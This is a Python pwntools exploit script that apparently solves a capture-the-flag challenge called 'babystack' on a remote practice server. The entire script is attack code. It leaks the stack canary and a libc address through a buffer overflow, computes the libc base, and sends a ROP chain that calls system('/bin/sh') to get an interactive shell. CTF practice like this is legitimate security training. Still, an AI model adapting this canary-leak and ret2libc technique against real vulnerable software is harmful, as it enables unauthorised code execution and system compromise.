from pwn import *


ld_path = "/home/fanxinli/libc-so/libc-23/ld-2.23.so"
libc_path = "/home/fanxinli/libc-so/libc-2.23-64.so"
# p = process([ld_path, "./babystack"], env={"LD_PRELOAD":libc_path})
p = remote("node4.buuoj.cn", 26106)
# pro = ELF("./babystack")
libc = ELF("/home/fanxinli/libc-so/libc-2.23-64.so")


def store(pad):
    p.sendafter(">> ", "1")
    p.send(pad)

def show():
    p.sendafter(">> ", "2")


# leak canary
store(cyclic(0x90-0x8+0x1))
show()
p.recv(0x90-0x8+0x1)
canary = u64(p.recv(7).rjust(8, b"\x00"))
print("canary: ", hex(canary))

# leak libc
store(cyclic(0x90+0x8))
show()
p.recv(0x90+0x8)
info = u64(p.recvuntil("\n", drop=True).ljust(8, b"\x00"))
print(hex(info))

# count
libc_start_main = libc.sym["__libc_start_main"]
base = info-libc_start_main-240
system = base+libc.sym["system"]
binsh = base+next(libc.search(b"/bin/sh\x00"))
print("base: ", hex(base))

# attack
pop_rdi_ret = 0x0400a93 
pad = cyclic(0x90-0x8)+p64(canary)+cyclic(0x8)
pad += p64(pop_rdi_ret)+p64(binsh)+p64(system)
store(pad)

p.sendafter(">> ", "3")

p.interactive()


